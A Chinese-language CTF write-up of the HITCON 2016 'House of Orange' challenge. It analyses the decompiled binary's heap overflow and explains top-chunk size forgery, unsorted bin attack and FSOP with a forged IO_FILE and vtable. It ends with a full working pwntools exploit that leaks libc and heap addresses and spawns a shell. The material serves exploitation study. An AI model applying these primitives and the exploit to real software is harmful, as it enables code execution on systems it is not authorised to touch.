# houseoforange_hitcon_2016
## 总结
根据本题，学习与收获有很多，因为本题涉及到的知识点很多，无法一一详述。主要的收获有：

- house of orange利用一般发生在程序没有free函数的情况下，需要伪造top chunk的size，下一次分配超过伪造的大小的chunk的时候，就会把old top chunk释放掉，放置在unorted bin中。
- 伪造top chunk的size需要注意的几点有：
    - size必须要对其到内存页，就是分配的内存大小加上top chunk size，一定是0x1000的倍数。
    - pre_inuse位要置为1
    - size不能小于最小的chunk大小
- IO_FILE利用时，在libc版本低于2.27的时候，可以利用调用链malloc_printerr->_libc_message->abort->_IO_flush_all_lockup->_IO_overflow，根据条件伪造IO_FILE结构，vtable表，触发system(/bin/sh)或者one_gadget。
- 可利用unsorted bin attack修改_IO_list_all指针指向，这个是时候，smallbin(0x60)地址就是前一个假的IO_FILE的chain指针内容。在libc-2.23.so中，伪造得到的fpchain为：main_arena + 0x88--->smallbin[0x60]
- 想要在堆上留下堆地址，需要利用到largebin，存储largebin的堆头的时候，会在fd_nextsize或bk_nextsize上留下堆地址。

## 题目分析
题目环境为ubuntu 16.04，libc-2.23.so。

### checksec
```bash
$ checksec houseoforange_hitcon_2016
[*] '/home/xxx/houseoforange_hitcon_2016'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

保护全部拉满！

### 函数分析
#### main
```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax

  initial(a1, a2, a3);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      v3 = get_uint();
      if ( v3 != 2 )
        break;
      see_house();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        upgrade_house();
      }
      else
      {
        if ( v3 == 4 )
        {
          puts("give up");
          exit(0);
        }
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      build_house();
    }
  }
}
```

可以看到，典型的菜单题。接下来进menu看看，有哪些选项。

#### menu
```c
int menu()
{
  puts("+++++++++++++++++++++++++++++++++++++");
  puts("@          House of Orange          @");
  puts("+++++++++++++++++++++++++++++++++++++");
  puts(" 1. Build the house                  ");
  puts(" 2. See the house                    ");
  puts(" 3. Upgrade the house                ");
  puts(" 4. Give up                          ");
  puts("+++++++++++++++++++++++++++++++++++++");
  return printf("Your choice : ");
}
```

3个选项，依次看看

#### build_house
```c
int build_house()
{
  unsigned int size; // [rsp+8h] [rbp-18h]
  signed int size_4; // [rsp+Ch] [rbp-14h]
  struct HouseMgr *mgr_ptr; // [rsp+10h] [rbp-10h]
  struct Orange *ptr2; // [rsp+18h] [rbp-8h]

  if ( build_count > 3u )   //可以分配4次
  {
    puts("Too many house");
    exit(1);
  }
  mgr_ptr = (struct HouseMgr *)malloc(0x10uLL);
  printf("Length of name :");
  size = get_uint();
  if ( size > 0x1000 )
    size = 0x1000;
  mgr_ptr->name = (unsigned __int64 *)malloc(size);
  if ( !mgr_ptr->name )
  {
    puts("Malloc error !!!");
    exit(1);
  }
  printf("Name :");
  read(0, mgr_ptr->name, size);
  ptr2 = (struct Orange *)calloc(1uLL, 8uLL);
  printf("Price of Orange:", 8LL);
  ptr2->price = get_uint();
  color_of_orange();
  printf("Color of Orange: ");
  size_4 = get_uint();
  if ( size_4 != 56746 && (size_4 <= 0 || size_4 > 7) )
  {
    puts("No such color");
    exit(1);
  }
  if ( size_4 == 0xDDAA )
    ptr2->color = 0xDDAA;
  else
    ptr2->color = size_4 + 30;
  mgr_ptr->orange = ptr2;
  cur_house_ptr = mgr_ptr;
  ++build_count;
  return puts("Finish");
}
```

因为我已经建立好了结构体，所以显示的都是price和color之类有属性的变量，简单梳理一下关键流程：

- 调用build_house次数限制为4次

- malloc(0x10) ---> chunk A，用来管理house

- malloc(input_size) ---> chunk B，其中，input_size位于0到4096之间，用来存储name

- read(0, B, input_size)，读取用户输入

- calloc(0x8) ---> chunk C，用来存储price和color，这俩加起来才占用8个字节

- A[0] = C，A[1] = B，C[0] = (price | color)

- cur_house_ptr置为chunk A的mem_ptr地址

#### see_house
```c
int see_house()
{
  int v0; // eax
  int result; // eax
  int v2; // eax

  if ( !cur_house_ptr )
    return puts("No such house !");
  if ( cur_house_ptr->orange->color == 56746 )
  {
    printf("Name of house : %s\n", cur_house_ptr->name);
    printf("Price of orange : %d\n", cur_house_ptr->orange->price);
    v0 = rand();
    result = printf("\x1B[01;38;5;214m%s\x1B[0m\n", orange_picture[v0 % 8]);
  }
  else
  {
    if ( (signed int)cur_house_ptr->orange->color <= 30
      || (signed int)cur_house_ptr->orange->color > 37 )
    {
      puts("Color corruption!");
      exit(1);
    }
    printf("Name of house : %s\n", cur_house_ptr->name);
    printf("Price of orange : %d\n", cur_house_ptr->orange->price);
    v2 = rand();
    result = printf("\x1B[1;%dm%s\x1B[0m\n",
                    cur_house_ptr->orange->color,
                    orange_picture[v2 % 8]);
  }
  return result;
}
```

需要注意的是：只能打印当前house的信息，没有提供数组索引之类的东西。

#### upgrade_house
```c
int upgrade_house()
{
  struct Orange *v1; // rbx
  unsigned int length; // [rsp+8h] [rbp-18h]
  signed int v3; // [rsp+Ch] [rbp-14h]

  if ( upgrade_count > 2u )     //可以编辑3次
    return puts("You can't upgrade more");
  if ( !cur_house_ptr )
    return puts("No such house !");
  printf("Length of name :");
  length = get_uint();
  if ( length > 0x1000 )
    length = 0x1000;
  printf("Name:");
  read(0, cur_house_ptr->name, length);
  printf("Price of Orange: ");
  v1 = cur_house_ptr->orange;
  v1->price = get_uint();
  color_of_orange();
  printf("Color of Orange: ");
  v3 = get_uint();
  if ( v3 != 0xDDAA && (v3 <= 0 || v3 > 7) )
  {
    puts("No such color");
    exit(1);
  }
  if ( v3 == 0xDDAA )
    cur_house_ptr->orange->color = 0xDDAA;
  else
    cur_house_ptr->orange->color = v3 + 30;
  ++upgrade_count;
  return puts("Finish");
}
```

简单梳理一下主要流程：

- 限制upgrade_house次数为3次
- 修改当前house，获取用户输入大小alter_size
- read(0, house->name, alter_size)，可以溢出修改

### 漏洞点
分析完主要函数后，漏洞点很明显。有且只有一个漏洞，就是在upgrade_house的时候，可以溢出修改house_name对应的chunk内容。

```c
  printf("Length of name :");
  length = get_uint();
  if ( length > 0x1000 )
    length = 0x1000;
  printf("Name:");
  read(0, cur_house_ptr->name, length);
  printf("Price of Orange: ");
```

需要注意的是，这里的堆溢出，只能修改top_chunk，因为没有提供堆数组和索引。还有，将申请的大小限制在0x1000内，是为了避免使用house of force之类的攻击。同时，题目没有提供释放chunk的函数，没有free的话，基本无法构造堆布局。本题，基本上把利用方式限制在了house of orange。

### 利用思路
#### 知识点
##### house of orange
1、利用条件

- 题目中没有给free之类的接口
- 可以修改top_chunk的size域

2、利用方法

- 溢出修改top chunk的size，注意，这里需要滿足一些检查条件
- 下次申请超过top_chunk size大小的chunk

3、攻击效果

- 把原来的top_chunk放置在unosrted bin中

##### FSOP
其实FSOP的利用方式有很多，结合不同的版本，不同的调用流程，攻击方法也不一样。这里主要谈一下64位下，libc-2.23.so中伪造IO_FILE结构和vtable，触发IO_flush_all_lockup刷新所有流进行攻击的方式。

1、IO_FILE结构

```
0x0   _flags
0x8   _IO_read_ptr
0x10  _IO_read_end
0x18  _IO_read_base
0x20  _IO_write_base
0x28  _IO_write_ptr
0x30  _IO_write_end
0x38  _IO_buf_base
0x40  _IO_buf_end
0x48  _IO_save_base
0x50  _IO_backup_base
0x58  _IO_save_end
0x60  _markers
0x68  _chain
0x70  _fileno
0x74  _flags2
0x78  _old_offset
0x80  _cur_column
0x82  _vtable_offset
0x83  _shortbuf
0x88  _lock
0x90  _offset
0x98  _codecvt
0xa0  _wide_data
0xa8  _freeres_list
0xb0  _freeres_buf
0xb8  __pad5
0xc0  _mode
0xc4  _unused2
0xd8  vtable
```

vtable的函数指针为：

```
const struct _IO_jump_t _IO_wstrn_jumps attribute_hidden =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_wstr_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),
  JUMP_INIT(xsputn, _IO_wdefault_xsputn),
  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),
  JUMP_INIT(seekoff, _IO_wstr_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_wdefault_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```
malloc_printerr最终调用到IO_flush_all_lock，源码位于libio\vswprintf.c:795
```c
int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  struct _IO_FILE *fp;
  int last_stamp;

#ifdef _IO_MTSAFE_IO
  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
  if (do_lock)
    _IO_lock_lock (list_all_lock);
#endif

  last_stamp = _IO_list_all_stamp;
  fp = (_IO_FILE *) _IO_list_all;
  // 刷新所有的文件流
  while (fp != NULL)
    {
      run_fp = fp;
      if (do_lock)
	_IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
#endif
	   )// 前面的或语句为真的时候，才会执行到_IO_OVERFLOW(fp, EOF)
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;
    ······
```

要想执行到_IO_OVERFLOE，要么滿足fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base，要么滿足_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)，一般来说，前面的条件好构造一点。

##### unsorted bin attack
这个攻击方式不用细说，这里关注的有两点：

- 如果main_arena + 88作为文件流地址，那么它的chain指针对应的是smallbin[0x60]。

- 如果申请的大小在largebin的范围内，那么在解链unsorted bin的时候，会先把unsorted bin chunk放在large bin中，就会在fd_nextsize和bk_nextsize上留下堆地址

```c
/* place chunk in bin */

          if (in_smallbin_range (size))
            {
              victim_index = smallbin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;
            }
          else
          {
              ······
              // 这里会被置为，留下堆地址
              victim->fd_nextsize = victim->bk_nextsize = victim;
          }
```

#### 利用过程
步骤：

- build_house(0x10) chunk A
- ugrade_house(A)，修改top_chunk的size域，为house of orange做准备。经过计算，这里修改为0xfa1
- build_house(0x1000) chunk B，触发free(old_top_chunk)，得到一块unsorted bin chunk
- build_house(0x400, name="a" * 8)，利用残留的指针泄露出libc地址
- upgrade_house(B, name="a"*0x10)，利用残留的指针泄露出heap地址
- upgrade_house(B)，触发unsorted bin attack，并修改unsortedbin chunk的size为0x61，同时伪造好IO_FILE结构和vtable表

## EXP
### 调试过程
- 1、定义好各个函数

```python
def build_house(length:int, name, price:int=0xff, color:int=1):
    sh.sendlineafter("Your choice : ", "1")
    sh.sendlineafter("Length of name :", str(length))
    sh.sendafter("Name :", name)
    sh.sendlineafter("Price of Orange:", str(price))
    sh.sendlineafter("Color of Orange:", str(color))
    sh.recvuntil("Finish\n")

    
def see_house():
    sh.sendlineafter("Your choice : ", "2")
    name_msg = sh.recvline_startswith("Name of house : ")
    price_msg = sh.recvline_startswith("Price of orange : ")
    log.success("name_msg:{}\nprice_msg:{}".format(name_msg, price_msg))
    return name_msg, price_msg


def upgrade_house(length:int, name, price:int=0xff, color:int=1):
    sh.sendlineafter("Your choice : ", "3")
    sh.sendlineafter("Length of name :", str(length))
    sh.sendafter("Name:", name)
    sh.sendlineafter("Price of Orange: ", str(price))
    sh.sendlineafter("Color of Orange: ", str(color))
    sh.recvuntil("Finish\n")
```
- 1、修改top chunk的size，触发house of orange

```python
# change the size of top_chunk to 0xfa1
upgrade_house(0x100, b"a" * 0x38 + p64(0xfa1))

# house of orange
build_house(0x1000, "cccc")
```
```gdb
pwndbg> heapinfo
(0x20)  fastbin[0]: 0x0
(0x30)  fastbin[1]: 0x0
(0x40)  fastbin[2]: 0x0
(0x50)  fastbin[3]: 0x0
(0x60)  fastbin[4]: 0x0
(0x70)  fastbin[5]: 0x0
(0x80)  fastbin[6]: 0x0
(0x90)  fastbin[7]: 0x0
(0xa0)  fastbin[8]: 0x0
(0xb0)  fastbin[9]: 0x0
top: 0x556c05d46010 (size : 0x20ff0)
last_remainder: 0x556c05d240a0 (size : 0xf40)
unsortbin: 0x556c05d240a0 (size : 0xf40)

pwndbg> dq 0x556c05d24060 20
0x556c05d24060  0x6161616161616161 0x0000000000000021
0x556c05d24070  0x0000556c05d24090 0x0000556c05d45010
0x556c05d24080  0x0000000000000000 0x0000000000000021
0x556c05d24090  0x0000001f000000ff 0x0000000000000000
0x556c05d240a0  0x0000000000000000 0x0000000000000f41
0x556c05d240b0  0x00007f0f29ab5b78 0x00007f0f29ab5b78
0x556c05d240c0  0x0000000000000000 0x0000000000000000
0x556c05d240d0  0x0000000000000000 0x0000000000000000
0x556c05d240e0  0x0000000000000000 0x0000000000000000
0x556c05d240f0  0x0000000000000000 0x0000000000000000

pwndbg> unsortedbin
unsortedbin
all: 0x556c05d240a0 --> 0x7f0f29ab5b78 (main_arena+88) <-- 0x556c05d240a0
```

- 2、泄露出libc地址和heap地址

```python
build_house(0x400, b"a" * 8)
msg, _ = see_house()
leak_libc_addr = msg[0x18: 0x18+6]
leak_libc_addr = u64(leak_libc_addr.ljust(8, b"\x00"))

LOG_ADDR("leak_libc_addr", leak_libc_addr)
libc_base_addr = leak_libc_addr - main_arena_offset - 1640
LOG_ADDR("libc_base_addr", libc_base_addr)
io_list_all_addr = libc_base_addr + libc.sym["_IO_list_all"]

upgrade_house(0x10, "a" * 0x10)
msg, _ = see_house()
heap_addr = msg[0x20:0x26]
heap_addr = u64(heap_addr.ljust(8, b"\x00"))
LOG_ADDR("heap_addr", heap_addr)
```
```
[+] name_msg:b'Name of house : aaaaaaaa\x88\xab)\x0f\x7f'
    price_msg:b'Price of orange : 255'
[+] leak_libc_addr ===> 0x7f0f29ab6188
[+] libc_base_addr ===> 0x7f0f296f1000
```

```
[+] name_msg:b'Name of house : aaaaaaaaaaaaaaaa\xc0@\xd2\x05lU'
    price_msg:b'Price of orange : 255'
[+] heap_addr ===> 0x556c05d240c0
```

- 3、触发unsortedbin attack，并伪造IO_FILE结构，刷新流拿到shell

```python
payload = flat(p64(0) * 3 + p64(libc_base_addr + libc.sym["system"]),
                0x400 * "\x00",
                "/bin/sh\x00", 
                0x61,
                0, 
                io_list_all_addr-0x10,
                0, 
                0x1,  # _IO_write_ptr
                0xa8 * b"\x00",
                heap_addr+0x10
                )
upgrade_house(0x600, payload)
sh.sendlineafter("Your choice : ", "1")
sh.interactive()
```
```gdb
pwndbg> fpchain
fpchain: 0x7f0f29ab5b78 --> 0x556c05d244f0 --> 0x0
pwndbg> fp 0x556c05d244f0
$1 = {
    file = {
        _flags = 1852400175,
        _IO_read_ptr = 0x61,
        _IO_read_end = 0x7f0f29ab5bc8 <main_arena+168>,
        _IO_read_base = 0x7f0f29ab5bc8 <main_arena+168>,
        _IO_write_base = 0x0,
        _IO_write_ptr = 0x1,
        _IO_write_end = 0x0,
        _IO_buf_base = 0x0,
        _IO_buf_end = 0x0,
        _IO_backup_base = 0x0,
        _IO_save_end = 0x0,
        _markers = 0x0,
        _chain = 0x0,
        _fileno = 0,
        _flags2 = 0,
        _old_offset = 0,
        _cur_column = 0,
        _vtable_offset = 0 '\000',
        _shortbuf = "",
        _lock = 0x0,
        _offset = 0,
        _codecvt = 0x0,
        _wide_data = 0x0,
        _freeres_list = 0x0,
        _freeres_buf = 0x0,
        _pad5 = 0,
        _mode = 0,
        _unused2 = "\000" <repeats 19 times>
    },
  vtable = 0x556c05d240d0,
}
```

```gdb
pwndbg> telescope 0x556c05d240d0
00:0000 0x556c05d240d0  0x0
01:0008 0x556c05d240d8  0x0
02:0010 0x556c05d240e0  0x0
03:0018 0x556c05d240e8  0x7f0f297363a0 <system>
04:0020 0x556c05d240f0  0x0
```

```bash
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x34 bytes:
    b'uid=0(root) gid=0(root) groups=0(root),1000(docker)\n'
```

可以看到，已经执行了system(/bin/sh)，拿到了shell。

这里调试的时候，不小心从opne-wsl.exe退出了，又重新attach上去，所以截图会看上不不一样。

### 完整exp
```python
from pwn  import *
import functools

sh = process("./houseoforange_hitcon_2016")
LOG_ADDR = lambda x, y: log.success('{} ===> {}'.format(x, hex(y)))
int16 = functools.partial(int, base=16)
context.arch="amd64"
context.os="linux"
context.endian="little"

main_arena_offset = 0x3c4b20

libc = ELF("libc-2.23.so")

def build_house(length:int, name, price:int=0xff, color:int=1):
    sh.sendlineafter("Your choice : ", "1")
    sh.sendlineafter("Length of name :", str(length))
    sh.sendafter("Name :", name)
    sh.sendlineafter("Price of Orange:", str(price))
    sh.sendlineafter("Color of Orange:", str(color))
    sh.recvuntil("Finish\n")

def see_house():
    sh.sendlineafter("Your choice : ", "2")
    name_msg = sh.recvline_startswith("Name of house : ")
    price_msg = sh.recvline_startswith("Price of orange : ")
    log.success("name_msg:{}\nprice_msg:{}".format(name_msg, price_msg))
    return name_msg, price_msg


def upgrade_house(length:int, name, price:int=0xff, color:int=1):
    sh.sendlineafter("Your choice : ", "3")
    sh.sendlineafter("Length of name :", str(length))
    sh.sendafter("Name:", name)
    sh.sendlineafter("Price of Orange: ", str(price))
    sh.sendlineafter("Color of Orange: ", str(color))
    sh.recvuntil("Finish\n")

build_house(0x10, "aaaa")

# change the size of top_chunk to 0xfa1
upgrade_house(0x100, b"a" * 0x38 + p64(0xfa1))

# house of orange
build_house(0x1000, "cccc")

# leak addr
build_house(0x400, b"a" * 8)
msg, _ = see_house()
leak_libc_addr = msg[0x18: 0x18+6]
leak_libc_addr = u64(leak_libc_addr.ljust(8, b"\x00"))

LOG_ADDR("leak_libc_addr", leak_libc_addr)
libc_base_addr = leak_libc_addr - main_arena_offset - 1640
LOG_ADDR("libc_base_addr", libc_base_addr)
io_list_all_addr = libc_base_addr + libc.sym["_IO_list_all"]

upgrade_house(0x10, "a" * 0x10)
msg, _ = see_house()
heap_addr = msg[0x20:0x26]
heap_addr = u64(heap_addr.ljust(8, b"\x00"))
LOG_ADDR("heap_addr", heap_addr)

payload = flat(p64(0) * 3 + p64(libc_base_addr + libc.sym["system"]),
                0x400 * "\x00",
                "/bin/sh\x00", 
                0x61,
                0, 
                io_list_all_addr-0x10,
                0, 
                0x1,  # _IO_write_ptr
                0xa8 * b"\x00",
                heap_addr+0x10
                )
upgrade_house(0x600, payload)
sh.sendlineafter("Your choice : ", "1")
sh.interactive()
```